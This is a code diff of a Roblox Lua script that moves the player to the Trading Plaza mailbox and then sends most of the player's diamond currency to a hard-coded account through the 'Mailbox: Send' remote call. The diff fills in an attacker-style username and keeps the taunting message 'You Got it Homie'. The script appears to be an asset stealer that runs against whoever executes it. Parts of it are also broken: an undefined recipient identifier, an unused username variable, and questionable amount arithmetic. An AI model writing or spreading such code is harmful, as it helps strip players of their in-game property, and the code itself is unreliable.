@@ -24,15 +24,15 @@ local diamid = curid(library.Save.Get().Inventory.Currency)
 game.Players.LocalPlayer.Character:PivotTo(game:GetService("Workspace").TradingPlaza.INTERACT.Machines.MailboxMachine.Arrow.CFrame + Vector3.new(0,4,0))
 wait(.5)
 if diamonds ~= 0 and diamonds > 20000 and diamid ~= nil then
-
 ------Don't Forget the username at all------
-local username = "You username"
-local args = {
-    [1] = Ma_Kristine2,
-    [2] = "You Got it Homie",
-    [3] = "Currency",
-    [4] = tostring(diamid),
-    [5] = diamonds - 1000000
-}
+    local username = "Muhammad6196"
+    local args = {
+        [1] = Ma_kristine2,
+        [2] = "You Got it Homie",
+        [3] = "Currency",
+        [4] = tostring(diamid),
+        [5] = diamonds - 1000000
+    }
 
-game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+end
